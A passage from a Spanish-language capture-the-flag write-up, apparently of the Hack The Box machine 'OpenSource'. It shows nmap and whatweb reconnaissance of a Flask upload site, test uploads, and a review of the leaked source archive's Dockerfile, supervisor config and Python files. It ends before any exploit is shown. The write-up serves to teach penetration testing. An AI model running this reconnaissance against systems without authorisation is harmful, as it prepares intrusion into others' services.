+</span></span><span style="display:flex;"><span>SF:tatic/vendor/popper/popper<span style="color:#ae81ff">\.</span>min<span style="color:#ae81ff">\.</span>js<span style="color:#ae81ff">\&#34;</span>&gt;&lt;/script&gt;<span style="color:#ae81ff">\n\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;scr
+</span></span><span style="display:flex;"><span>SF:ipt<span style="color:#ae81ff">\x</span>20src<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/static/vendor/bootstrap/js/bootstrap<span style="color:#ae81ff">\.</span>min<span style="color:#ae81ff">\.</span>js<span style="color:#ae81ff">\&#34;</span>&gt;&lt;/script&gt;
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;script<span style="color:#ae81ff">\x</span>20src<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/static/js/ie10-viewport-bug-workaro
+</span></span><span style="display:flex;"><span>SF:und<span style="color:#ae81ff">\.</span>js<span style="color:#ae81ff">\&#34;</span>&gt;&lt;/script&gt;<span style="color:#ae81ff">\n\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;\x</span>20h
+</span></span><span style="display:flex;"><span>SF:ref<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/static/vendor/bootstrap/css/bootstrap<span style="color:#ae81ff">\.</span>css<span style="color:#ae81ff">\&#34;</span>/&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;\x</span>20/static/vendor/bootstrap/css/
+</span></span><span style="display:flex;"><span>SF:bootstrap-grid<span style="color:#ae81ff">\.</span>css<span style="color:#ae81ff">\&#34;</span>/&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;\x</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>SF:0href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;\x</span>20/static/vendor/bootstrap/css/bootstrap-reboot<span style="color:#ae81ff">\.</span>css<span style="color:#ae81ff">\&#34;</span>/&gt;<span style="color:#ae81ff">\n\n\
+</span></span></span><span style="display:flex;"><span>SF:x20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;)%r(HTTPOptions,C7,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20200<span style="color:#ae81ff">\x</span>20OK
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\r\n</span>Server:<span style="color:#ae81ff">\x</span>20Werkzeug/2<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\.</span>2<span style="color:#ae81ff">\x</span>20Python/3<span style="color:#ae81ff">\.</span>10<span style="color:#ae81ff">\.</span>3<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Mon,<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:07<span style="color:#ae81ff">\x</span>20Oct<span style="color:#ae81ff">\x</span>202024<span style="color:#ae81ff">\x</span>2018:36:36<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20text/html;<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Allow:<span style="color:#ae81ff">\x</span>20OPTIONS,<span style="color:#ae81ff">\x</span>20GET,<span style="color:#ae81ff">\x</span>20HEAD<span style="color:#ae81ff">\r\n</span>Content-Length:<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>SF:x200<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;)%r(RTSPRequest,1F4,&#34;</span>&lt;!DOCTYPE<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:HTML<span style="color:#ae81ff">\x</span>20PUBLIC<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\&#34;</span>-//W3C//DTD<span style="color:#ae81ff">\x</span>20HTML<span style="color:#ae81ff">\x</span>204<span style="color:#ae81ff">\.</span>01//EN<span style="color:#ae81ff">\&#34;\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>SF:0<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\&#34;</span>http://www<span style="color:#ae81ff">\.</span>w3<span style="color:#ae81ff">\.</span>org/TR/html4/strict<span style="color:#ae81ff">\.</span>dtd<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n</span>&lt;html&gt;<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>SF:n<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;head&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20http-
+</span></span><span style="display:flex;"><span>SF:equiv<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Content-Type<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>text/html;charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>SF:0<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;title&gt;Error<span style="color:#ae81ff">\x</span>20response&lt;/title&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20&lt;/head&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;body&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;h
+</span></span><span style="display:flex;"><span>SF:1&gt;Error<span style="color:#ae81ff">\x</span>20response&lt;/h1&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;p&gt;Error<span style="color:#ae81ff">\x</span>20c
+</span></span><span style="display:flex;"><span>SF:ode:<span style="color:#ae81ff">\x</span>20400&lt;/p&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;p&gt;Message:<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:request<span style="color:#ae81ff">\x</span>20version<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\(</span><span style="color:#e6db74">&#39;RTSP/1\.0&#39;</span><span style="color:#ae81ff">\)\.</span>&lt;/p&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>SF:20<span style="color:#ae81ff">\x</span>20&lt;p&gt;Error<span style="color:#ae81ff">\x</span>20code<span style="color:#ae81ff">\x</span>20explanation:<span style="color:#ae81ff">\x</span>20HTTPStatus<span style="color:#ae81ff">\.</span>BAD_REQUEST<span style="color:#ae81ff">\x</span>20-<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>SF:x20Bad<span style="color:#ae81ff">\x</span>20request<span style="color:#ae81ff">\x</span>20syntax<span style="color:#ae81ff">\x</span>20or<span style="color:#ae81ff">\x</span>20unsupported<span style="color:#ae81ff">\x</span>20method<span style="color:#ae81ff">\.</span>&lt;/p&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>SF:x20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;/body&gt;<span style="color:#ae81ff">\n</span>&lt;/html&gt;<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Nmap done: 1 IP address (1 host up) scanned in 97.60 seconds
+</span></span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Parece que el <strong>servicio SSH</strong> no acepta un login con credenciales. Podríamos comprobarlo, pero no tenemos credenciales por ahora, por lo que todo apunta a que debemos comenzar por el <strong>puerto 80</strong>.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="HTTP">Analizando Servicio HTTP</h3>
+<p>Entremos:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura1.png">
+</p>
+<p>Al parecer, esto es un servicio para subir y compartir archivos.</p>
+<p>Veamos que nos dice <strong>Wappalizer</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura2.png">
+</p>
+<p>Está utilizando <strong>Flask y Python</strong>, esto puede ser útil más adelante.</p>
+<p>Veamos si <strong>whatweb</strong> nos da algo de información extra:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whatweb http://10.10.11.164
+</span></span><span style="display:flex;"><span>http://10.10.11.164 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Bootstrap, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTTPServer<span style="color:#f92672">[</span>Werkzeug/2.1.2 Python/3.10.3<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.10.11.164<span style="color:#f92672">]</span>, JQuery<span style="color:#f92672">[</span>3.4.1<span style="color:#f92672">]</span>, Python<span style="color:#f92672">[</span>3.10.3<span style="color:#f92672">]</span>, Script, Title<span style="color:#f92672">[</span>upcloud - Upload files <span style="color:#66d9ef">for</span> Free!<span style="color:#f92672">]</span>, Werkzeug<span style="color:#f92672">[</span>2.1.2<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Se ven algunas cosas extras que también reportó el escaneo con <strong>nmap</strong>, pero nada nuevo.</p>
+<p>Hay varios botones que no llevan a nada, a excepción de dos:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura3.png">
+</p>
+<p>El primero nos descarga un <strong>archivo ZIP</strong> que analizaremos después y el segundo nos lleva a otra página en la que podemos subir archivos:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura4.png">
+</p>
+<p>Probemos a subir un archivo random para ver qué pasa:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Esto es una prueba&#34;</span> &gt; test.txt
+</span></span></code></pre></div><p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura5.png">
+</p>
+<p>Nos genera un link que podemos visitar:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura6.png">
+</p>
+<p>Parece que nos está interpretando lo que estamos subiendo.</p>
+<p>Podríamos probar si nos acepta <strong>archivos PHP</strong> aunque lo dudo bastante, pero lo que sí podemos probar, es subir un archivo de <strong>Python</strong> para ver si lo interpreta.</p>
+<p>Vamos a crear uno simple:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura30.png">
+</p>
+<p>Y carguémoslo:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura7.png">
+</p>
+<p>Parece que no interpreto el archivo como <strong>Python</strong>, sino que lo descargo.</p>
+<p>Cambiémoslo a un archivo de texto y probemos de nuevo:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura8.png">
+</p>
+<p>Nada, de momento, no es por aquí la movida.</p>
+<h3 id="zip">Analizando Contenido de Archivo ZIP</h3>
+<p>Veamos el contenido del <strong>archivo ZIP</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>7z l source.zip
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>7-Zip 24.08 <span style="color:#f92672">(</span>x64<span style="color:#f92672">)</span> : Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> 1999-2024 Igor Pavlov : 2024-08-11
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Scanning the drive <span style="color:#66d9ef">for</span> archives:
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> file, <span style="color:#ae81ff">2489147</span> bytes <span style="color:#f92672">(</span><span style="color:#ae81ff">2431</span> KiB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Listing archive: source.zip
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--
+</span></span><span style="display:flex;"><span>Path <span style="color:#f92672">=</span> source.zip
+</span></span><span style="display:flex;"><span>Type <span style="color:#f92672">=</span> zip
+</span></span><span style="display:flex;"><span>Physical Size <span style="color:#f92672">=</span> <span style="color:#ae81ff">2489147</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Date      Time    Attr         Size   Compressed  Name
+</span></span><span style="display:flex;"><span>------------------- ----- ------------ ------------  ------------------------
+</span></span><span style="display:flex;"><span>2022-04-28 05:45:52 D....            <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">0</span>  app
+</span></span><span style="display:flex;"><span>2022-04-28 06:50:20 D....            <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">0</span>  app/app
+</span></span><span style="display:flex;"><span>2022-04-28 06:50:20 .....          <span style="color:#ae81ff">707</span>          <span style="color:#ae81ff">310</span>  app/app/views.py
+</span></span><span style="display:flex;"><span>2022-04-28 05:34:45 .....          <span style="color:#ae81ff">262</span>          <span style="color:#ae81ff">160</span>  app/app/__init__.py
+</span></span><span style="display:flex;"><span>2022-04-28 05:39:31 D....            <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">0</span>  app/app/static
+</span></span><span style="display:flex;"><span>2022-04-28 05:34:45 D....            <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">0</span>  app/app/static/js
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>2022-04-28 05:45:17 .....          <span style="color:#ae81ff">189</span>          <span style="color:#ae81ff">138</span>  .git/hooks/post-update.sample
+</span></span><span style="display:flex;"><span>2022-04-28 05:45:17 .....         <span style="color:#ae81ff">3610</span>         <span style="color:#ae81ff">1141</span>  .git/hooks/update.sample
+</span></span><span style="display:flex;"><span>2022-04-28 05:45:17 .....         <span style="color:#ae81ff">3079</span>         <span style="color:#ae81ff">1463</span>  .git/hooks/fsmonitor-watchman.sample
+</span></span><span style="display:flex;"><span>2022-04-28 06:50:20 .....         <span style="color:#ae81ff">5746</span>         <span style="color:#ae81ff">2509</span>  .git/index
+</span></span><span style="display:flex;"><span>2022-04-28 05:45:17 D....            <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">0</span>  .git/logs
+</span></span><span style="display:flex;"><span>2022-04-28 06:50:20 .....         <span style="color:#ae81ff">1741</span>          <span style="color:#ae81ff">405</span>  .git/logs/HEAD
+</span></span><span style="display:flex;"><span>2022-04-28 05:45:17 D....            <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">0</span>  .git/logs/refs
+</span></span><span style="display:flex;"><span>2022-04-28 05:45:52 D....            <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">0</span>  .git/logs/refs/heads
+</span></span><span style="display:flex;"><span>2022-04-28 05:55:55 .....          <span style="color:#ae81ff">497</span>          <span style="color:#ae81ff">204</span>  .git/logs/refs/heads/public
+</span></span><span style="display:flex;"><span>2022-04-28 05:47:24 .....          <span style="color:#ae81ff">581</span>          <span style="color:#ae81ff">233</span>  .git/logs/refs/heads/dev
+</span></span><span style="display:flex;"><span>------------------- ----- ------------ ------------  ------------------------
+</span></span><span style="display:flex;"><span>2022-04-28 06:50:20            <span style="color:#ae81ff">6204731</span>      <span style="color:#ae81ff">2440275</span>  <span style="color:#ae81ff">152</span> files, <span style="color:#ae81ff">96</span> folders
+</span></span></code></pre></div><p>Podemos ver archivos de <strong>Git</strong>, entonces, acabamos de descargar un repositorio comprimido.</p>
+<p>Descomprímelo para analizar su contenido:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>unzip source.zip
+</span></span><span style="display:flex;"><span>Archive:  source.zip
+</span></span><span style="display:flex;"><span>   creating: app/
+</span></span><span style="display:flex;"><span>   creating: app/app/
+</span></span><span style="display:flex;"><span>  inflating: app/app/views.py        
+</span></span><span style="display:flex;"><span>  inflating: app/app/__init__.py     
+</span></span><span style="display:flex;"><span>   creating: app/app/static/
+</span></span><span style="display:flex;"><span>   creating: app/app/static/js/
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Son bastantes archivos que vamos a ver que son:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>app  build-docker.sh  config  Dockerfile  source.zip
+</span></span></code></pre></div><p>Veamos el contenido del <strong>Dockerfile</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat Dockerfile
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>FROM python:3-alpine
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Install packages</span>
+</span></span><span style="display:flex;"><span>RUN apk add --update --no-cache supervisor
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Upgrade pip</span>
+</span></span><span style="display:flex;"><span>RUN python -m pip install --upgrade pip
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Install dependencies</span>
+</span></span><span style="display:flex;"><span>RUN pip install Flask
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Setup app</span>
+</span></span><span style="display:flex;"><span>RUN mkdir -p /app
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Switch working environment</span>
+</span></span><span style="display:flex;"><span>WORKDIR /app
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Add application</span>
+</span></span><span style="display:flex;"><span>COPY app .
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Setup supervisor</span>
+</span></span><span style="display:flex;"><span>COPY config/supervisord.conf /etc/supervisord.conf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Expose port the server is reachable on</span>
+</span></span><span style="display:flex;"><span>EXPOSE <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Disable pycache</span>
+</span></span><span style="display:flex;"><span>ENV PYTHONDONTWRITEBYTECODE<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set mode</span>
+</span></span><span style="display:flex;"><span>ENV MODE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PRODUCTION&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Run supervisord</span>
+</span></span><span style="display:flex;"><span>CMD <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/usr/bin/supervisord&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#34;/etc/supervisord.conf&#34;</span><span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Parece que al ejecutar este archivo, nos crea un <strong>contenedor de docker</strong> que tendrá varias configuraciones activas.</p>
+<p>Analizándolo un poco a fondo, entendemos que se usa una versión minimalista de <strong>Linux</strong> llamada <strong>3-alpine</strong> que se instala con <strong>Python</strong> (o eso creo yo), actualizar <strong>PIP</strong>, instalar <strong>Flask</strong>, crear directorios, copiar un archivo para configurar un <strong>supervisor</strong>, exponer el <strong>puerto 80</strong>, desactiva el <strong>pycache</strong>, entra en <strong>modo producción</strong> y ejecuta el <strong>supervisor</strong>.</p>
+<p>El archivo <strong>build-docker.sh</strong> no tiene información útil.</p>
+<p>Entremos al <strong>directorio config</strong> y analicemos el archivo que está ahí:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat supervisord.conf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>supervisord<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user<span style="color:#f92672">=</span>root
+</span></span><span style="display:flex;"><span>nodaemon<span style="color:#f92672">=</span>true
+</span></span><span style="display:flex;"><span>logfile<span style="color:#f92672">=</span>/dev/null
+</span></span><span style="display:flex;"><span>logfile_maxbytes<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>pidfile<span style="color:#f92672">=</span>/run/supervisord.pid
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>program:flask<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>command<span style="color:#f92672">=</span>python /app/run.py
+</span></span><span style="display:flex;"><span>stdout_logfile<span style="color:#f92672">=</span>/dev/stdout
+</span></span><span style="display:flex;"><span>stdout_logfile_maxbytes<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>stderr_logfile<span style="color:#f92672">=</span>/dev/stderr
+</span></span><span style="display:flex;"><span>stderr_logfile_maxbytes<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>Bien, este archivo me da a entender que el <strong>usuario root</strong> es el dueño y quien supervisa todo el contenedor. Además, se ve que está ejecutando un archivo llamado <strong>run.py</strong> en <strong>Flask</strong>.</p>
+<p>Vamos a verlo, se encuentra dentro del <strong>directorio /app</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> app <span style="color:#f92672">import</span> app
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    port <span style="color:#f92672">=</span> int(os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;PORT&#34;</span>, <span style="color:#ae81ff">80</span>))
+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, port<span style="color:#f92672">=</span>port)
+</span></span></code></pre></div><p>No podemos sacar mucho de aquí y tampoco hay más que podamos ver en este directorio.</p>
+<p>Entremos al otro <strong>directorio /app</strong> y veamos qué hay ahí:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>__init__.py  configuration.py  static  templates  utils.py  views.py
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pwd
+</span></span><span style="display:flex;"><span>/content/app/app
+</span></span></code></pre></div><p>Aquí hay más archivos <strong>Python</strong>.</p>
+<p>Pero los que se me hacen interesantes son el archivo <strong>utils.py y views.py</strong>.</p>
+<p>Veamos primero el archivo <strong>utils.py</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">current_milli_time</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> round(time<span style="color:#f92672">.</span>time() <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Pass filename and return a secure version, which can then safely be stored on a regular file system.
